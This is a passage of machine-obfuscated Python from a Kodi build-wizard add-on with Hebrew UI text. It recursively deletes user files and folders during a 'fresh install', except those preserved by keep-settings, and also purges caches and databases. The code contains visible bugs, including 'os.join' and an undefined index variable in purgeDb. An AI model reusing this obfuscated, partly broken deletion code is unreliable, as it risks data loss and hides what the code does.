				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4894
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'skin.anonymous.mod'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4895
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'skin.Premium.mod'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4896
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'skin.anonymous.nox'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4897
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'skin.phenomenal'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4898
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'plugin.video.metalliq'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4899
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'skin.titan'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4901
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'pvr.iptvsimple'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4902
				elif OOOO0O00OO00O0OO0 =='sources.xml'and OO00OO000000O00O0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4904
				elif OOOO0O00OO00O0OO0 =='quicknav.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4907
				elif OOOO0O00OO00O0OO0 =='x1101.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4908
				elif OOOO0O00OO00O0OO0 =='b-srtym-b.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4909
				elif OOOO0O00OO00O0OO0 =='x1102.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4910
				elif OOOO0O00OO00O0OO0 =='b-sdrvt-b.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4911
				elif OOOO0O00OO00O0OO0 =='x1112.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4912
				elif OOOO0O00OO00O0OO0 =='b-tlvvyzyh-b.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4913
				elif OOOO0O00OO00O0OO0 =='x1111.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4914
				elif OOOO0O00OO00O0OO0 =='b-tvknyshrly-b.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4915
				elif OOOO0O00OO00O0OO0 =='x1110.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4916
				elif OOOO0O00OO00O0OO0 =='b-yldym-b.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4917
				elif OOOO0O00OO00O0OO0 =='x1114.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4918
				elif OOOO0O00OO00O0OO0 =='b-mvzyqh-b.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4919
				elif OOOO0O00OO00O0OO0 =='mainmenu.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4920
				elif OOOO0O00OO00O0OO0 =='skin.Premium.mod.properties'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4921
				elif OOOO0O00OO00O0OO0 =='x1122.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4923
				elif OOOO0O00OO00O0OO0 =='b-spvrt-b.DATA.xml'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4924
				elif OOOO0O00OO00O0OO0 =='favourites.xml'and OO00OO000000O00O0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4929
				elif OOOO0O00OO00O0OO0 =='guisettings.xml'and OO00OO000000O00O0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4931
				elif OOOO0O00OO00O0OO0 =='profiles.xml'and OO00OO000000O00O0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4932
				elif OOOO0O00OO00O0OO0 =='advancedsettings.xml'and OO00OO000000O00O0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4933
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4934
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'program.apollo'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4935
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4936
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'plugin.video.elementum'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4939
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4940
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4941
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'weather.yahoo'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4942
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'plugin.video.quasar'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4943
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'program.apollo'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4944
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4945
				elif OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4946
				elif OOOO0O00OO00O0OO0 in LOGFILES :wiz .log ("Keep Log File: %s"%OOOO0O00OO00O0OO0 ,xbmc .LOGNOTICE )#line:4947
				elif OOOO0O00OO00O0OO0 .endswith ('.db'):#line:4948
					try :#line:4949
						if OOOO0O00OO00O0OO0 ==O0O0O00O00O0OO00O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOOO0O00OO00O0OO0 ,KODIV ),xbmc .LOGNOTICE )#line:4950
						else :os .remove (os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ))#line:4951
					except Exception as OOO0OO0O0O0O00OOO :#line:4952
						if not OOOO0O00OO00O0OO0 .startswith ('Textures13'):#line:4953
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4954
							wiz .log ("-> %s"%(str (OOO0OO0O0O0O00OOO )),xbmc .LOGNOTICE )#line:4955
							wiz .purgeDb (os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ))#line:4956
				else :#line:4957
					DP .update (int (wiz .percentage (OO00O0O0O000O00O0 ,O0OO00OOO0O00OO00 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O00OO00O0OO0 ),'')#line:4958
					try :os .remove (os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ))#line:4959
					except Exception as OOO0OO0O0O0O00OOO :#line:4960
						wiz .log ("Error removing %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4961
						wiz .log ("-> / %s"%(str (OOO0OO0O0O0O00OOO )),xbmc .LOGNOTICE )#line:4962
			if DP .iscanceled ():#line:4963
				DP .close ()#line:4964
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4965
				return False #line:4966
		for O00OO0O0O0000O0O0 ,O0O0OO0O0O0O0OO0O ,O000OO0O0OOOO00OO in os .walk (O00O000OO0O000000 ,topdown =True ):#line:4967
			O0O0OO0O0O0O0OO0O [:]=[OOO0O000OOO0O0O0O for OOO0O000OOO0O0O0O in O0O0OO0O0O0O0OO0O if OOO0O000OOO0O0O0O not in EXCLUDES ]#line:4968
			for OOOO0O00OO00O0OO0 in O0O0OO0O0O0O0OO0O :#line:4969
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO0O00OO00O0OO0 ),'')#line:4970
			  if OOOO0O00OO00O0OO0 not in ["Database","userdata","temp","addons","addon_data"]:#line:4971
			   if not (OOOO0O00OO00O0OO0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4972
			    if not (OOOO0O00OO00O0OO0 =='skin.titan'and KEEPSKIN3 =='true'):#line:4974
			      if not (OOOO0O00OO00O0OO0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4975
			       if not (OOOO0O00OO00O0OO0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4976
			        if not (OOOO0O00OO00O0OO0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4977
			         if not (OOOO0O00OO00O0OO0 =='program.apollo'and KEEPINFO =='true'):#line:4978
			          if not (OOOO0O00OO00O0OO0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4979
			           if not (OOOO0O00OO00O0OO0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:4980
			            if not (OOOO0O00OO00O0OO0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4981
			             if not (OOOO0O00OO00O0OO0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4982
			              if not (OOOO0O00OO00O0OO0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4983
			               if not (OOOO0O00OO00O0OO0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4984
			                if not (OOOO0O00OO00O0OO0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4985
			                 if not (OOOO0O00OO00O0OO0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4986
			                  if not (OOOO0O00OO00O0OO0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:4987
			                   if not (OOOO0O00OO00O0OO0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:4988
			                    if not (OOOO0O00OO00O0OO0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4989
			                     if not (OOOO0O00OO00O0OO0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4990
			                       if not (OOOO0O00OO00O0OO0 =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4992
			                           if not (OOOO0O00OO00O0OO0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4996
			                            if not (OOOO0O00OO00O0OO0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4997
			                             if not (OOOO0O00OO00O0OO0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4998
			                              if not (OOOO0O00OO00O0OO0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:4999
			                               if not (OOOO0O00OO00O0OO0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5000
			                                  shutil .rmtree (os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),ignore_errors =True ,onerror =None )#line:5002
			if DP .iscanceled ():#line:5003
				DP .close ()#line:5004
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5005
				return False #line:5006
		DP .close ()#line:5007
		wiz .clearS ('build')#line:5008
		if over ==True :#line:5009
			return True #line:5010
		elif install =='restore':#line:5011
			return True #line:5012
		elif install :#line:5013
			buildWizard (install ,'normal',over =True )#line:5014
		else :#line:5015
			if INSTALLMETHOD ==1 :O0O00O00OO00OO00O =1 #line:5016
			elif INSTALLMETHOD ==2 :O0O00O00OO00OO00O =0 #line:5017
			else :O0O00O00OO00OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5018
			if O0O00O00OO00OO00O ==1 :wiz .reloadFix ('fresh')#line:5019
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5020
	else :#line:5021
		if not install =='restore':#line:5022
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5023
			wiz .refresh ()#line:5024
def clearCache ():#line:5029
		wiz .clearCache ()#line:5030
def fixwizard ():#line:5034
		wiz .fixwizard ()#line:5035
def totalClean ():#line:5037
		wiz .clearCache ()#line:5039
		wiz .clearPackages ('total')#line:5040
		clearThumb ('total')#line:5041
		cleanfornewbuild ()#line:5042
def cleanfornewbuild ():#line:5043
		try :#line:5044
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5045
		except :#line:5046
			pass #line:5047
		try :#line:5048
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5049
		except :#line:5050
			pass #line:5051
		try :#line:5052
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5053
		except :#line:5054
			pass #line:5055
def clearThumb (type =None ):#line:5056
	OO0O0OOOO000OOO0O =wiz .latestDB ('Textures')#line:5057
	if not type ==None :OOOOO0O0OO000O000 =1 #line:5058
	else :OOOOO0O0OO000O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO0O0OOOO000OOO0O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5059
	if OOOOO0O0OO000O000 ==1 :#line:5060
		try :wiz .removeFile (os .join (DATABASE ,OO0O0OOOO000OOO0O ))#line:5061
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO0O0OOOO000OOO0O )#line:5062
		wiz .removeFolder (THUMBS )#line:5063
	else :wiz .log ('Clear thumbnames cancelled')#line:5065
	wiz .redoThumbs ()#line:5066
def purgeDb ():#line:5068
	O00O0O0O000OOOO0O =[];O0OO0OOOOO00O0OO0 =[]#line:5069
	for OO0O0O000000O0OOO ,O0O00OOOO00OO0OOO ,O0O00OO0OO000O00O in os .walk (HOME ):#line:5070
		for O000O00O0OOOO00O0 in fnmatch .filter (O0O00OO0OO000O00O ,'*.db'):#line:5071
			if O000O00O0OOOO00O0 !='Thumbs.db':#line:5072
				O0O0O00000O00OO0O =os .path .join (OO0O0O000000O0OOO ,O000O00O0OOOO00O0 )#line:5073
				O00O0O0O000OOOO0O .append (O0O0O00000O00OO0O )#line:5074
				O000O0O00OO0OO00O =O0O0O00000O00OO0O .replace ('\\','/').split ('/')#line:5075
				O0OO0OOOOO00O0OO0 .append ('(%s) %s'%(O000O0O00OO0OO00O [len (O000O0O00OO0OO00O )-2 ],O000O0O00OO0OO00O [len (O000O0O00OO0OO00O )-1 ]))#line:5076
	if KODIV >=16 :#line:5077
		O000OOO0O0O0O0O0O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO0OOOOO00O0OO0 )#line:5078
		if O000OOO0O0O0O0O0O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5079
		elif len (O000OOO0O0O0O0O0O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5080
		else :#line:5081
			for O0OO0O000OOO0O00O in O000OOO0O0O0O0O0O :wiz .purgeDb (O00O0O0O000OOOO0O [O0OO0O000OOO0O00O ])#line:5082
	else :#line:5083
		O000OOO0O0O0O0O0O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO0OOOOO00O0OO0 )#line:5084
		if O000OOO0O0O0O0O0O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5085
		else :wiz .purgeDb (O00O0O0O000OOOO0O [O0OO0O000OOO0O00O ])#line:5086
def fastupdatefirstbuild (OOOO00OOO000O00O0 ):#line:5092
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5094
	if ENABLE =='Yes':#line:5095
		if not NOTIFY =='true':#line:5096
			O00O0OO00O0OOO000 =wiz .workingURL (NOTIFICATION )#line:5097
